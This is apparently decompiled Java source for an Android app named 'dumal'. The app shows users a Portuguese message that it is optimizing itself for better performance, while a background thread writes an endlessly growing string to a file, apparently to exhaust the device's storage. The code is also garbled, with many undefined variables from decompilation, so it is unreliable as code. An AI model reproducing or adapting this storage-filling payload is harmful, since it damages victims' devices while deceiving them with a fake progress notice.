package dumal.net;

import adrt.ADRTLogCatReader;
import android.app.Activity;
import android.app.AlertDialog.Builder;
import android.app.Notification.BigTextStyle;
import android.app.NotificationManager;
import android.content.Context;
import android.os.Bundle;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

public class MainActivity extends Activity {
	Button btn;
	TextView txt;

	class AnonymousClass_100000000 extends Thread {
		private final MainActivity this$0;

		AnonymousClass_100000000(MainActivity r6_MainActivity) {
			super();
			Thread r3_Thread = r0_Thread;
			r0_Thread.this$0 = r6_MainActivity;
		}

		static MainActivity access$0(MainActivity.AnonymousClass_100000000 r4_MainActivity_AnonymousClass_100000000) {
			return r4_MainActivity_AnonymousClass_100000000.this$0;
		}

		@Override
		public void run() {
			this$0.writeFile();
		}
	}


	public MainActivity() {
		super();
		Activity r0_Activity = this;
		Activity r2_Activity = r0_Activity;
	}

	public void changeLog() {
		Context r0_Context = this;
		Builder r8_Builder = r5_Builder;
		Builder r2_Builder = r8_Builder;
		r2_Builder.create().show();
		Toast.makeText(r0_Context, "Voc\u00ea pode sair do aplicativo enquanto o processo ocorre...", 1).show();
	}

	public void initialize() {
		MainActivity r0_MainActivity = this;
		r0_MainActivity.changeLog();
		r0_MainActivity.notification();
		AnonymousClass_100000000 r5_AnonymousClass_100000000 = r2_AnonymousClass_100000000;
		r5_AnonymousClass_100000000.start();
	}

	void notification() {
		Context r0_Context = this;
		android.app.Notification.Builder r8_android_app_Notification_Builder = r5_android_app_Notification_Builder;
		BigTextStyle r8_BigTextStyle = r6_BigTextStyle;
		((NotificationManager) r0_Context.getSystemService(Context.NOTIFICATION_SERVICE)).notify(0, r8_android_app_Notification_Builder.setSmallIcon(R.drawable.ic_launcher).setContentTitle("Aguarde alguns minutos").setStyle(r8_BigTextStyle.bigText("Estamos optimizando o app para melhor desempenho em seu dispositivo...")).setAutoCancel(false).build());
	}

	@Override
	protected void onCreate(Bundle r6_Bundle) {
		Context r0_Context = this;
		ADRTLogCatReader.onContext(r0_Context, "com.aide.ui");
		super.onCreate(r6_Bundle);
		r0_Context.setContentView(R.layout.main);
		r0_Context.initialize();
	}

	public void writeFile() {
		FileOutputStream r12_FileOutputStream;
		String r5_String;
		int r6i;
		File r12_File = r8_File;
		StringBuffer r12_StringBuffer = r10_StringBuffer;
		File r2_File = r12_File;
		r12_File = r8_File;
		File r3_File = r12_File;
		try {
			r12_FileOutputStream = r8_FileOutputStream;
			r5_String = "0";
			r6i = 0;
			while (true) {
				r12_StringBuffer = r8_StringBuffer;
				r5_String = r12_StringBuffer.append(r5_String).append(String.valueOf(r6i)).toString();
				r12_FileOutputStream.write(r5_String.getBytes());
				r6i++;
			}
		} catch (IOException e) {
			e.printStackTrace();
			return;
		}
	}
}
